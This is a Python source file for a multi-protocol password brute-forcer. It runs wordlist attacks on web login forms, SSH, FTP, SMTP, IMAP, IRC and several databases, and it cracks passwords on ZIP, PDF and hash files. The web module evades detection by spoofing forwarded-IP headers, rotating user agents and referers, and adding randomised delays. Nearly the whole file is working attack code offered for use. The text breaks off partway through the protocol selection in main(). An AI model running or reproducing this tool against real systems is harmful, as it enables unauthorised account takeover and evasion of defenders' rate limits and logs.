#!/usr/bin/env python3
"""
Super BruteForcer: Combines HTTP/HTTPS brute-forcer (with PHP form detection) and multi-protocol brute-forcer
Supports SSH, FTP, SMTP, MySQL, PostgreSQL, MSSQL, Oracle, IMAP, IRC, as well as ZIP/PDF/hash brute-forcing.
"""

import argparse
import threading
import multiprocessing
import queue
import socket
import sys
import time
import traceback
import random
import re
import requests
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
import warnings
from cryptography.utils import CryptographyDeprecationWarning
warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)
# For pretty output
from termcolor import colored
from prettytable import PrettyTable
from pathlib import Path

# HTML Parsing & UserAgent
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

# Protocol-specific
import paramiko        # SSH
import ftplib          # FTP
import smtplib         # SMTP
import pymysql         # MySQL
import psycopg2        # PostgreSQL
import pymssql         # MS SQL
import imaplib         # IMAP
import oracledb        # Oracle (modern)
import hashlib         # for hash check
import zipfile         # ZIP bruteforce
import pyzipper        # Use pyzipper for ZIP bruteforce
import pikepdf         # PDF password check
import bcrypt          # bcrypt hash

# Argon2 support
try:
    from argon2 import PasswordHasher, exceptions as argon2_exceptions
    ARGON2_AVAILABLE = True
except ImportError:
    ARGON2_AVAILABLE = False

# ===== Shared + HTTP/HTTPS Brute =====

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://duckduckgo.com/",
    "https://www.yandex.com/",
]
FAILURE_PATTERNS = [
    re.compile(r"invalid password", re.I),
    re.compile(r"incorrect login", re.I),
    re.compile(r"login failed", re.I),
    re.compile(r"302.*(?:/login|\?error=)", re.I),
]
SUCCESS_PATTERNS = [
    re.compile(r"dashboard", re.I),
    re.compile(r"logout", re.I),
    re.compile(r"welcome", re.I),
    re.compile(r"session", re.I),
]

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def human_delay(jitter=0.45, base=0.7):
    delay = random.uniform(base, base + jitter)
    time.sleep(delay)

def random_headers():
    ua = UserAgent()
    headers = {
        "User-Agent": ua.random,
        "Referer": random.choice(REFERERS),
        "X-Forwarded-For": random_ip(),
        "X-Real-IP": random_ip(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
    }
    return headers

def load_list(filename):
    with open(filename, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

def detect_form_fields(html):
    soup = BeautifulSoup(html, "html.parser")
    forms = soup.find_all("form")
    login_forms = []
    USER_CANDIDATES = [
        r"user", r"uname", r"login", r"email", r"userid", r"username", r"user_name", r"usr",
        r"account", r"member", r"profile", r"user_id", r"accountname", r"membername", r"nickname", r"handle",
        r"useraccount", r"userprofile", r"userlogin", r"useremail", r"mail", r"user_mail", r"accountid", r"account_id",
        r"contact", r"contact_email", r"contactname", r"usercontact", r"user_mailid", r"userhandle", r"usernick", r"nickname",
        r"person", r"personid", r"person_name", r"personlogin", r"person_email", r"personid", r"personaccount", r"usernumber",
        r"useridnumber", r"user_num", r"usercode", r"user_code", r"memberid", r"memberidnumber", r"member_id", r"member_code",
        r"client", r"clientid", r"clientname", r"client_user", r"clientaccount", r"clientlogin", r"clientemail", r"userclient",
        r"customer", r"customerid", r"customer_name", r"customerlogin", r"customeremail", r"customernumber", r"usercustomer",
        r"subscriber", r"subscriberid", r"subscriber_name", r"subscriberlogin", r"subscriberemail", r"subscribernumber",
        r"registrant", r"registrantid", r"registrant_name", r"registrantlogin", r"registrantemail", r"registrantnumber",
        r"participant", r"participantid", r"participant_name", r"participantlogin", r"participantemail", r"participantnumber",
        r"admin", r"adminid", r"admin_name", r"adminlogin", r"adminemail", r"adminnumber", r"useradmin", r"user_admin",
        r"operator", r"operatorid", r"operator_name", r"operatorlogin", r"operatoremail", r"operatornumber", r"useroperator",
        r"staff", r"staffid", r"staff_name", r"stafflogin", r"staffemail", r"staffnumber", r"userstaff",
        r"employee", r"employeeid", r"employee_name", r"employeelogin", r"employeeemail", r"employeenumber", r"useremployee",
        r"identity", r"identityid", r"identity_name", r"identitylogin", r"identityemail", r"identitynumber", r"useridentity",
        r"accountnumber", r"useraccountnumber", r"name", r"fullname", r"userfullname", r"displayname", r"userdisplay",
        r"owner", r"ownerid", r"ownername", r"ownerlogin", r"owneremail", r"ownernumber", r"userowner",
        r"auth_user", r"authid", r"authname", r"authlogin", r"authemail", r"authnumber", r"userauth",
        r"author", r"authorid", r"authorname", r"authorlogin", r"authoremail", r"authornumber", r"userauthor",
        r"principal", r"principalid", r"principalname", r"principallogin", r"principalemail", r"principalnumber",
        r"account_holder", r"user_account_holder", r"login_id", r"user_login_id", r"member_login_id", r"account_login_id",
        r"user_ref", r"userreference", r"userref", r"userkey", r"user_key", r"user_token", r"user_identifier", r"user_label",
        r"user_tag", r"userattr", r"userproperty", r"userval", r"user_value", r"userinput", r"user_entry", r"user_record",
        r"user_field", r"userparam", r"user_parameter", r"user_arg"
    ]
    PASS_CANDIDATES = [
        r"pass", r"password", r"passwd", r"pwd", r"userpass", r"passcode", r"pass_word", r"passphrase",
        r"secret", r"secrete", r"secretkey", r"secret_key", r"usersecret", r"key", r"private_key", r"privatekey",
        r"authpass", r"loginpass", r"login_password", r"account_password", r"accountpass", r"memberpass", r"member_password",
        r"adminpass", r"admin_password", r"adminpwd", r"admin_secret", r"operatorpass", r"operator_password", r"clientpass",
        r"client_password", r"userpwd", r"user_password", r"user_passwd", r"user_passcode", r"securitycode", r"security_code",
        r"accesscode", r"access_code", r"accesskey", r"access_key", r"token", r"apitoken", r"api_token", r"auth_token",
        r"sessionpass", r"session_password", r"sessionkey", r"session_key", r"sessiontoken", r"session_token", r"hash",
        r"hashpass", r"hash_password", r"encryptedpass", r"encrypted_password", r"encryptedpwd", r"cryptpass", r"crypt_password",
        r"cryptpwd", r"pin", r"pincode", r"pin_code", r"securitypin", r"security_pin", r"passphrase", r"phrase",
        r"unlockcode", r"unlock_code", r"unlockkey", r"unlock_key", r"unlocktoken", r"unlock_token", r"resetcode",
        r"reset_code", r"password_reset", r"recoverycode", r"recovery_code", r"recoverykey", r"recovery_key", r"pass_reset",
        r"temp_pass", r"temporary_password", r"temp_password", r"temppass", r"one_time_password", r"otp", r"onetimepass",
        r"onetimepassword", r"one_time_pass", r"one_time_key", r"changepass", r"change_password", r"newpass", r"new_password",
        r"newpwd", r"oldpass", r"old_password", r"oldpwd", r"currentpass", r"current_password", r"currentpwd",
        r"userpin", r"user_pin", r"memberpin", r"member_pin", r"clientpin", r"client_pin", r"apipass", r"api_pass",
        r"apipassword", r"api_password", r"apikey", r"api_key", r"authkey", r"auth_key", r"authpwd", r"auth_password",
        r"loginpwd", r"login_password", r"login_key", r"login_secret", r"access_token", r"tokenpw", r"token_pwd",
        r"resetpwd", r"reset_password", r"password1", r"password2", r"password3", r"password4", r"password5",
        r"dbpassword", r"db_password", r"database_password", r"databasepass", r"dbpass", r"db_pass", r"dbpwd", r"db_pwd",
        r"pwd1", r"pwd2", r"pwd3", r"pwd4", r"pwd5", r"mailpassword", r"mail_password", r"emailpassword", r"email_password",
        r"mailpass", r"mail_pass", r"emailpass", r"email_pass", r"ftp_password", r"ftppass", r"ftppwd", r"ftp_passwd"
    ]
    for form in forms:
        inputs = form.find_all("input")
        field_names = {"username": None, "password": None, "csrf": None, "others": {}}
        for inp in inputs:
            name = inp.get("name", "")
            typ = inp.get("type", "")
            if any(re.fullmatch(c, name, re.I) or re.search(c, name, re.I) for c in USER_CANDIDATES):
                field_names["username"] = name
            elif typ == "password" or any(re.fullmatch(c, name, re.I) or re.search(c, name, re.I) for c in PASS_CANDIDATES):
                field_names["password"] = name
            elif typ == "hidden" and ("csrf" in name.lower() or "token" in name.lower()):
                field_names["csrf"] = name
                field_names["others"][name] = inp.get("value", "")
            elif typ == "hidden":
                field_names["others"][name] = inp.get("value", "")
        if field_names["username"] and field_names["password"]:
            login_forms.append((form, field_names))
    return login_forms[0] if login_forms else (None, None)

def detect_success_failure(resp, old_body):
    if resp.status_code in [301, 302, 303, 307, 308]:
        loc = resp.headers.get("Location", "")
        for pat in FAILURE_PATTERNS:
            if pat.search(loc):
                return False
        for pat in SUCCESS_PATTERNS:
            if pat.search(loc):
                return True
    body = resp.text
    if old_body and body != old_body:
        for pat in SUCCESS_PATTERNS:
            if pat.search(body):
                return True
    for pat in FAILURE_PATTERNS:
        if pat.search(body):
            return False
    if "set-cookie" in resp.headers:
        cookies = resp.cookies.get_dict()
        if any("session" in k.lower() or "auth" in k.lower() for k in cookies):
            return True
    if old_body and "form" in old_body and "form" not in body:
        return True
    return False

def http_https_brute(url, users, passwords, user_field=None, pass_field=None):
    sess = requests.Session()
    try:
        resp = sess.get(url, headers=random_headers(), timeout=10)
    except Exception as e:
        print(f"[!] Error connecting to target: {e}")
        sys.exit(1)
    old_body = resp.text
    form, fields = detect_form_fields(resp.text)
    if fields is None:
        fields = {"username": None, "password": None, "csrf": None, "others": {}}
    if user_field:
        fields["username"] = user_field
    if pass_field:
        fields["password"] = pass_field
    if not form or not fields["username"] or not fields["password"]:
        print("[!] No login form detected, exiting.")
        print("    [*] Try --user-field and --pass-field to specify field names manually.")
        sys.exit(1)
    action = form.get("action") or url
    method = form.get("method", "post").lower()
    if not action.startswith("http"):
        action = requests.compat.urljoin(url, action)
    print(f"[+] Login form detected at {action} ({method.upper()})")
    print(f"    [*] Username field: {fields['username']}, Password field: {fields['password']}")
    for user in users:
        for passwd in passwords:
            data = {}
            data[fields["username"]] = user
            data[fields["password"]] = passwd
            for k, v in fields["others"].items():
                data[k] = v
            if fields.get("csrf"):
                try:
                    fresh = sess.get(url, headers=random_headers(), timeout=10)
                    _, fields_new = detect_form_fields(fresh.text)
                    if fields_new and fields_new["csrf"]:
                        data[fields_new["csrf"]] = fields_new["others"].get(fields_new["csrf"], "")
                except Exception:
                    pass
            headers = random_headers()
            human_delay()
            print(f"[.] Trying {user}:{passwd} ...", end=" ")
            try:
                if method == "post":
                    r = sess.post(action, data=data, headers=headers, allow_redirects=True, timeout=10)
                else:
                    r = sess.get(action, params=data, headers=headers, allow_redirects=True, timeout=10)
            except Exception as e:
                print(f"error: {e}")
                continue
            if detect_success_failure(r, old_body):
                print("\n[+] SUCCESS!")
                print(f"Username: {user}\nPassword: {passwd}")
                return
            else:
                print("fail")
    print("[-] No valid credentials found.")

# ===== Multi-protocol Brute =====
def vprint(msg, color=None, attrs=None):
    allowed_colors = ["green", "red", "yellow", "cyan", None]
    if color not in allowed_colors:
        color = None
    print(colored(msg, color=color, attrs=attrs or ['bold']))

def format_attempt(proto, host, login, password, attempt_num, total, child_id, found, debug):
    msg = f'[ATTEMPT] target {host} - login "{login}" - pass "{password}" - {attempt_num} of {total} [child {child_id}] (0/0)'
    print(colored(msg, 'cyan', attrs=['bold']))
    if found:
        port_map = {
            "ssh": 22, "ftp": 21, "smtp": 25, "mysql": 3306, "postgres": 5432, "mssql": 1433,
            "irc": 6667, "oracle": 1521, "imap": 143
        }
        port = port_map.get(proto, '???')
        msg = f'[{port}][{proto}] host: {host}   login: {login}   password: {password}'
        print(colored(msg, 'green', attrs=['bold']))

def format_status(host, found, proto, debug):
    if found:
        vprint(f"1 of 1 target successfully completed, 1 valid password found", "green", ['bold'])
    else:
        vprint(f"1 of 1 target completed, 0 valid password found", "red", ['bold'])

def error_message(msg):
    print(colored(f'[ERROR] {msg}', 'red', attrs=['bold']))

def info_message(msg):
    print(colored(f'[INFO] {msg}', 'cyan', attrs=['bold']))

class BruteForceWorker(threading.Thread):
    def __init__(self, target_func, username_queue, password_queue, debug=False, result_flag=None,
                 proto=None, host=None, total_attempts=0, child_id=0):
        super().__init__()
        self.target_func = target_func
        self.username_queue = username_queue
        self.password_queue = password_queue
        self.debug = debug
        self.found = False
        self.result_flag = result_flag
        self.proto = proto
        self.host = host
        self.total_attempts = total_attempts
        self.child_id = child_id

    def run(self):
        attempt_num = 0
        try:
            while not (self.found or (self.result_flag and self.result_flag.is_set())):
                try:
                    username = self.username_queue.get_nowait()
                except queue.Empty:
                    return
                while not (self.found or (self.result_flag and self.result_flag.is_set())):
                    try:
                        password = self.password_queue.get_nowait()
                    except queue.Empty:
                        break
                    attempt_num += 1
                    format_attempt(self.proto, self.host, username, password, attempt_num, self.total_attempts, self.child_id, False, False)
                    try:
                        success = self.target_func(username, password, self.child_id, attempt_num, self.total_attempts)
                    except Exception:
                        continue
                    if success:
                        format_attempt(self.proto, self.host, username, password, attempt_num, self.total_attempts, self.child_id, True, False)
                        self.found = True
                        if self.result_flag:
                            self.result_flag.set()
                        return
        except Exception:
            return

def is_connection_refused(e):
    msg = str(e).lower()
    return (
        isinstance(e, ConnectionRefusedError)
        or "refused" in msg
        or "connection closed" in msg
        or "timed out" in msg
        or "broken pipe" in msg
        or "no route to host" in msg
        or "reset by peer" in msg
    )

# SSH
_last_ssh_info = {}
def ssh_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, debug=False, port=22):
    global _last_ssh_info
    ssh_info_key = f"{username}@{target_ip}:{port}"
    if ssh_info_key not in _last_ssh_info:
        info_message(f'Testing if password authentication is supported by ssh://{username}@{target_ip}:{port}')
        _last_ssh_info[ssh_info_key] = True
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target_ip, port=port, username=username, password=password, timeout=5, banner_timeout=5)
        ssh.close()
        info_message(f'Successful, password authentication is supported by ssh://{target_ip}:{port}')
        return True
    except paramiko.ssh_exception.AuthenticationException:
        return False
    except Exception as e:
        msg = str(e).lower()
        if "no route to host" in msg:
            error_message(f"could not connect to ssh://{target_ip}:{port} - No route to host")
        elif is_connection_refused(e):
            error_message(f"could not connect to ssh://{target_ip}:{port} - Connection refused")
        return False

# FTP
def ftp_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, debug=False, port=21):
    try:
        ftp = ftplib.FTP()
        ftp.connect(target_ip, port=port, timeout=5)
        ftp.login(user=username, passwd=password)
        ftp.quit()
        return True
    except ftplib.error_perm:
        return False
    except Exception as e:
        msg = str(e).lower()
        if "no route to host" in msg:
            error_message(f"could not connect to ftp://{target_ip}:{port} - No route to host")
        elif is_connection_refused(e):
            error_message(f"could not connect to ftp://{target_ip}:{port} - Connection refused")
        return False

# IMAP
def imap_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, port=143, use_ssl=False, debug=False):
    try:
        if use_ssl:
            M = imaplib.IMAP4_SSL(target_ip, port)
        else:
            M = imaplib.IMAP4(target_ip, port)
        rv, data = M.login(username, password)
        if rv == "OK":
            M.logout()
            return True
        else:
            M.logout()
            return False
    except imaplib.IMAP4.error:
        return False
    except Exception as e:
        msg = str(e).lower()
        if "no route to host" in msg:
            error_message(f"could not connect to imap://{target_ip}:{port} - No route to host")
        elif is_connection_refused(e):
            error_message(f"could not connect to imap://{target_ip}:{port} - Connection refused")
        return False

# Oracle
def oracle_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, port=1521, debug=False):
    sids = ["ORCL", "XE", "ORACLE", "TEST"]
    services = ["XE", "orcl", "oracle", "test"]
    for sid in sids:
        try:
            dsn = oracledb.makedsn(target_ip, port, sid=sid)
            conn = oracledb.connect(user=username, password=password, dsn=dsn, timeout=5)
            conn.close()
            return True
        except oracledb.DatabaseError as e:
            err = str(e)
            if "ORA-01017" in err or "invalid username/password" in err.lower():
                continue
            elif is_connection_refused(e) or "ORA-12541" in err or "could not resolve" in err.lower():
                error_message(f"could not connect to oracle://{target_ip}:{port} - No route to host")
                continue
            else:
                continue
        except Exception as e:
            continue
    for service in services:
        try:
            dsn = oracledb.makedsn(target_ip, port, service_name=service)
            conn = oracledb.connect(user=username, password=password, dsn=dsn, timeout=5)
            conn.close()
            return True
        except oracledb.DatabaseError as e:
            err = str(e)
            if "ORA-01017" in err or "invalid username/password" in err.lower():
                continue
            elif is_connection_refused(e) or "ORA-12541" in err or "could not resolve" in err.lower():
                error_message(f"could not connect to oracle://{target_ip}:{port} - No route to host")
                continue
            else:
                continue
        except Exception as e:
            continue
    return False

# SMTP
def smtp_bruteforce(username, password, child_id, attempt_num, total, smtp_server=None, port=25, use_ssl=False, debug=False):
    try:
        if use_ssl:
            server = smtplib.SMTP_SSL(smtp_server, port, timeout=5)
        else:
            server = smtplib.SMTP(smtp_server, port, timeout=5)
        server.ehlo()
        server.login(username, password)
        server.quit()
        return True
    except smtplib.SMTPAuthenticationError:
        return False
    except Exception as e:
        msg = str(e).lower()
        if "no route to host" in msg:
            error_message(f"could not connect to smtp://{smtp_server}:{port} - No route to host")
        elif is_connection_refused(e):
            error_message(f"could not connect to smtp://{smtp_server}:{port} - Connection refused")
        return False

# MySQL
def mysql_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, port=3306, debug=False):
    try:
        conn = pymysql.connect(host=target_ip, user=username, password=password, port=port, connect_timeout=5)
        conn.close()
        return True
    except pymysql.err.OperationalError as e:
        if "Access denied" in str(e):
            return False
        elif is_connection_refused(e):
            error_message(f"could not connect to mysql://{target_ip}:{port} - Connection refused")
            return False
        else:
            return False
    except Exception as e:
        msg = str(e).lower()
        if "no route to host" in msg:
            error_message(f"could not connect to mysql://{target_ip}:{port} - No route to host")
        elif is_connection_refused(e):
            error_message(f"could not connect to mysql://{target_ip}:{port} - Connection refused")
        return False

# PostgreSQL
def postgres_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, port=5432, debug=False):
    try:
        conn = psycopg2.connect(host=target_ip, user=username, password=password, port=port, connect_timeout=5)
        conn.close()
        return True
    except psycopg2.OperationalError as e:
        if "authentication failed" in str(e).lower():
            return False
        elif is_connection_refused(e):
            error_message(f"could not connect to postgres://{target_ip}:{port} - Connection refused")
            return False
        else:
            return False
    except Exception as e:
        msg = str(e).lower()
        if "no route to host" in msg:
            error_message(f"could not connect to postgres://{target_ip}:{port} - No route to host")
        elif is_connection_refused(e):
            error_message(f"could not connect to postgres://{target_ip}:{port} - Connection refused")
        return False

# MSSQL
def mssql_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, port=1433, debug=False):
    try:
        conn = pymssql.connect(server=target_ip, user=username, password=password, port=port, timeout=5)
        conn.close()
        return True
    except pymssql.OperationalError as e:
        if "login failed" in str(e).lower():
            return False
        elif is_connection_refused(e):
            error_message(f"could not connect to mssql://{target_ip}:{port} - Connection refused")
            return False
        else:
            return False
    except Exception as e:
        msg = str(e).lower()
        if "no route to host" in msg:
            error_message(f"could not connect to mssql://{target_ip}:{port} - No route to host")
        elif is_connection_refused(e):
            error_message(f"could not connect to mssql://{target_ip}:{port} - Connection refused")
        return False

# IRC
def irc_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, port=6667, debug=False):
    try:
        combos = [
            [("PASS", password), ("NICK", username), ("USER", f"{username} 0 * :mx")],
            [("NICK", username), ("USER", f"{username} 0 * :mx"), ("PASS", password)],
            [("NICK", username), ("PASS", password), ("USER", f"{username} 0 * :mx")],
        ]
        encodings = ["utf-8", "latin1"]
        for encoding in encodings:
            for flow in combos:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(7)
                    s.connect((target_ip, port))
                    for cmd, val in flow:
                        msg = f"{cmd} {val}\r\n".encode(encoding)
                        s.sendall(msg)
                        time.sleep(0.2)
                    try:
                        s.settimeout(2)
                        reply = s.recv(4096)
                        resp = reply.decode(encoding, errors="replace")
                        if any(word in resp.lower() for word in [
                            "001", "002", "welcome", "your host", "ircop", "mode", "motd", "end of",
                            "you are now", "privileges", "logged in", "success", "nick registered"
                        ]):
                            s.close()
                            return True
                        elif any(word in resp.lower() for word in [
                            "throttle", "too many", "wait", "flood", "reconnect", "denied"
                        ]):
                            s.close()
                            return False
                    except socket.timeout:
                        pass
                    s.close()
                except Exception:
                    pass
        return False
    except Exception as e:
        msg = str(e).lower()
        if "no route to host" in msg:
            error_message(f"could not connect to irc://{target_ip}:{port} - No route to host")
        elif is_connection_refused(e):
            error_message(f"could not connect to irc://{target_ip}:{port} - Connection refused")
        return False

def multi_worker(target_func, usernames, passwords, debug, result_flag, proto, host, child_id):
    username_queue = queue.Queue()
    password_queue = queue.Queue()
    for u in usernames:
        if u is not None:
            username_queue.put(u)
    for p in passwords:
        password_queue.put(p)
    total_attempts = len(usernames) * len(passwords)
    threads = []
    for _ in range(4):
        t = BruteForceWorker(target_func, username_queue, password_queue, debug=False,
                             result_flag=result_flag, proto=proto, host=host, total_attempts=total_attempts,
                             child_id=child_id)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

# ===== File/Hash Crack =====
def print_cracking_report(target_type, identifier, hash_algo, status, password, attempts, time_taken, impact):
    table = PrettyTable()
    table.header = False
    table.border = True
    table.add_row(["+-------------------------------------------------------------+"])
    table.add_row(["|                      CRACKING REPORT                         |"])
    table.add_row(["+-------------------------------------------------------------+"])
    table.add_row([f"| Target Type       : {target_type.ljust(44)}|"])
    table.add_row([f"| Target Identifier : {identifier[:46]}|"])
    table.add_row([f"| Hash Algorithm    : {hash_algo.ljust(44)}|"])
    table.add_row([f"| Status            : {status.ljust(44)}|"])
    table.add_row([f"| Password Found    : {password.ljust(44)}|"])
    table.add_row([f"| Attempts          : {str(attempts).ljust(44)}|"])
    table.add_row([f"| Time Taken        : {time_taken.ljust(44)}|"])
    table.add_row(["+-------------------------------------------------------------+"])
    table.add_row([f"| Impact Analysis                                              "])
    for k, v in impact.items():
        table.add_row([f"| - {k.ljust(16)}: {v.ljust(43)}|"])
    table.add_row(["+-------------------------------------------------------------+"])
    print(table.get_string(fields=table.field_names))

def detect_hash_type(hashval):
    if hashval.startswith('$2a$') or hashval.startswith('$2b$') or hashval.startswith('$2y$'):
        return 'bcrypt'
    elif hashval.startswith('$argon2'):
        return 'argon2'
    elif len(hashval) == 40 and all(c in '0123456789abcdef' for c in hashval.lower()):
        return 'sha1'
    elif len(hashval) == 64 and all(c in '0123456789abcdef' for c in hashval.lower()):
        return 'sha256'
    elif len(hashval) == 128 and all(c in '0123456789abcdef' for c in hashval.lower()):
        return 'sha512_blake2b'
    elif len(hashval) == 32 and all(c in '0123456789abcdef' for c in hashval.lower()):
        return 'md5'
    else:
        return 'unknown'

def try_hash(password, hashval):
    results = {}
    try:
        if (hashval.startswith('$2a$') or hashval.startswith('$2b$') or hashval.startswith('$2y$')):
            results['bcrypt'] = bcrypt.checkpw(password.encode(), hashval.encode())
    except Exception:
        results['bcrypt'] = False
    if ARGON2_AVAILABLE and hashval.startswith('$argon2'):
        try:
            ph = PasswordHasher()
            results['argon2'] = ph.verify(hashval, password)
        except argon2_exceptions.VerifyMismatchError:
            results['argon2'] = False
        except Exception:
            results['argon2'] = False
    try:
        if len(hashval) == 40 and all(c in '0123456789abcdef' for c in hashval.lower()):
            results['sha1'] = hashlib.sha1(password.encode()).hexdigest() == hashval
    except Exception:
        results['sha1'] = False
    try:
        if len(hashval) == 64 and all(c in '0123456789abcdef' for c in hashval.lower()):
            results['sha256'] = hashlib.sha256(password.encode()).hexdigest() == hashval
    except Exception:
        results['sha256'] = False
    try:
        if len(hashval) == 128 and all(c in '0123456789abcdef' for c in hashval.lower()):
            results['sha512'] = hashlib.sha512(password.encode()).hexdigest() == hashval
            results['blake2b'] = hashlib.blake2b(password.encode()).hexdigest() == hashval
    except Exception:
        results['sha512'] = False
        results['blake2b'] = False
    try:
        if len(hashval) == 32 and all(c in '0123456789abcdef' for c in hashval.lower()):
            results['md5'] = hashlib.md5(password.encode()).hexdigest() == hashval
    except Exception:
        results['md5'] = False
    return any(results.values()), results

# ===== Main CLI =====
def main():
    parser = argparse.ArgumentParser(description="Super BruteForcer: HTTP/HTTPS brute-forcer + Multi-protocol + File/Hash cracker")
    parser.add_argument("target", nargs="?", help="Target URL or protocol/IP (http[s]://, ssh://, ftp://, etc.)")
    parser.add_argument("-l", "--username", help="Single username to test")
    parser.add_argument("-L", "--userlist", help="File with multiple usernames")
    parser.add_argument("-P", "--passlist", required=True, help="Password list file")
    parser.add_argument("-t", "--threads", type=int, default=4, help="Number of concurrent threads (default 4)")
    parser.add_argument("--dbg", action="store_true", help="Enable debug verbose output (DEPRECATED, IGNORED)")
    parser.add_argument("-p", "--port", type=int, help="Port number if applicable")
    parser.add_argument("-S", "--ssl", action="store_true", help="Use SSL (for SMTP or IMAP)")
    parser.add_argument("-f", "--file", help="File path (for zip/hash/pdf bruteforce)")
    parser.add_argument("--user-field", help="Override for username field name (HTTP/HTTPS)")
    parser.add_argument("--pass-field", help="Override for password field name (HTTP/HTTPS)")
    args = parser.parse_args()

    # Load usernames
    usernames = []
    if args.username:
        usernames.append(args.username)
    elif args.userlist:
        try:
            with open(args.userlist, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
        except Exception as e:
            error_message(f"Could not open userlist: {e}")
            sys.exit(1)
    else:
        usernames = [None]

    # Load passwords
    try:
        with open(args.passlist, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        error_message(f"Could not open password list: {e}")
        sys.exit(1)

    # --- FILE MODE ---
    if args.file and not args.target:
        file_lower = args.file.lower()
        start_time = time.time()
        password_found = None
        attempts = 0
        status = "FAILURE"
        if file_lower.endswith(".zip"):
            identifier = args.file
            hash_algo = "N/A"
            try:
                with pyzipper.AESZipFile(args.file) as zf:
                    for pwd in passwords:
                        attempts += 1
                        try:
                            zf.extractall(pwd=pwd.encode('utf-8'))
                            password_found = pwd
                            status = "SUCCESS"
                            break
                        except Exception:
                            continue
            except Exception as e:
                error_message(f"Failed to open ZIP file: {e}")
                sys.exit(1)
            time_taken = time.strftime('%H:%M:%S', time.gmtime(time.time() - start_time))
            print_cracking_report(
                "ZIP FILE",
                identifier,
                hash_algo,
                status,
                password_found or "N/A",
                attempts,
                time_taken,
                {
                    "Confidentiality": "BREACHED" if status == "SUCCESS" else "SECURE",
                    "Integrity": "COMPROMISED" if status == "SUCCESS" else "INTACT",
                    "Availability": "UNAFFECTED"
                }
            )
        elif file_lower.endswith(".pdf"):
            identifier = args.file
            hash_algo = "N/A"
            try:
                for pwd in passwords:
                    attempts += 1
                    try:
                        with pikepdf.open(args.file, password=pwd):
                            password_found = pwd
                            status = "SUCCESS"
                            break
                    except Exception:
                        continue
            except Exception as e:
                error_message(f"Failed to open PDF file: {e}")
                sys.exit(1)
            time_taken = time.strftime('%H:%M:%S', time.gmtime(time.time() - start_time))
            print_cracking_report(
                "PDF FILE",
                identifier,
                hash_algo,
                status,
                password_found or "N/A",
                attempts,
                time_taken,
                {
                    "Confidentiality": "SECURE" if status == "FAILURE" else "BREACHED",
                    "Integrity": "INTACT",
                    "Availability": "UNAFFECTED"
                }
            )
        elif file_lower.endswith(".hash"):
            identifier = None
            hashval = ""
            try:
                with open(args.file, 'r') as f:
                    hashval = f.read().strip()
            except Exception as e:
                error_message(f"Failed to open hash file: {e}")
                sys.exit(1)
            hash_type = detect_hash_type(hashval)
            hash_algo = {
                'bcrypt': 'bcrypt',
                'argon2': 'argon2',
                'sha1': 'SHA-1',
                'sha256': 'SHA-256',
                'sha512_blake2b': 'SHA-512/BLAKE2b',
                'md5': 'MD5',
                'unknown': 'Unknown'
            }.get(hash_type, 'Unknown')
            identifier = hashval[:32] + "..." if len(hashval) > 32 else hashval
            for pwd in passwords:
                attempts += 1
                ok, allres = try_hash(pwd, hashval)
                if ok:
                    password_found = pwd
                    status = "SUCCESS"
                    hash_algo = "/".join([k.upper() for k, v in allres.items() if v])
                    break
            time_taken = time.strftime('%H:%M:%S', time.gmtime(time.time() - start_time))
            print_cracking_report(
                "HASH",
                identifier,
                hash_algo,
                status,
                password_found or "N/A",
                attempts,
                time_taken,
                {
                    "Confidentiality": "BREACHED" if status == "SUCCESS" else "SECURE",
                    "Integrity": "INTACT",
                    "Availability": "UNAFFECTED"
                }
            )
        else:
            error_message(f"Unknown file type for brute-force: {args.file}")
            sys.exit(1)
        sys.exit(0)

    # --- NETWORK & HTTP/HTTPS MODE ---
    if not args.target:
        error_message("Please specify a network target (protocol://ip) or a file with -f.")
        sys.exit(1)

    # HTTP/HTTPS (web) brute
    if args.target.startswith("http://") or args.target.startswith("https://"):
        http_https_brute(args.target, usernames, passwords, args.user_field, args.pass_field)
        sys.exit(0)

    # Parse target protocol and host for other protocols
    target = args.target
    if "://" not in target:
        error_message("Target must be in protocol:// format")
        sys.exit(1)
    proto, target_rest = target.split("://", 1)
    target_ip = None
    target_port = args.port

    if proto in ["ssh", "ftp", "smb", "irc", "oracle", "mssql", "postgres", "imap"]:
        if ":" in target_rest:
            ip, port_str = target_rest.split(":", 1)
            target_ip = ip
            if not target_port:
                try:
                    target_port = int(port_str)
                except:
                    pass
        else:
            target_ip = target_rest
    elif proto in ["mysql"]:
        if ":" in target_rest:
            ip, port_str = target_rest.split(":", 1)
            target_ip = ip
            if not target_port:
                target_port = int(port_str)
        else:
            target_ip = target_rest
    elif proto in ["smtp"]:
        target_ip = target_rest
        if not target_port:
            target_port = 465 if args.ssl else 25
    else:
        error_message(f"Unsupported protocol: {proto}")
        sys.exit(1)

    # Select target function
    if proto == "ssh":
        target_func = lambda u, p, child_id, attempt_num, total: ssh_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, debug=False, port=target_port or 22)
    elif proto == "ftp":
        target_func = lambda u, p, child_id, attempt_num, total: ftp_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, debug=False, port=target_port or 21)
    elif proto == "smtp":
        target_func = lambda u, p, child_id, attempt_num, total: smtp_bruteforce(u, p, child_id, attempt_num, total, smtp_server=target_ip, port=target_port, use_ssl=args.ssl, debug=False)
    elif proto == "mysql":
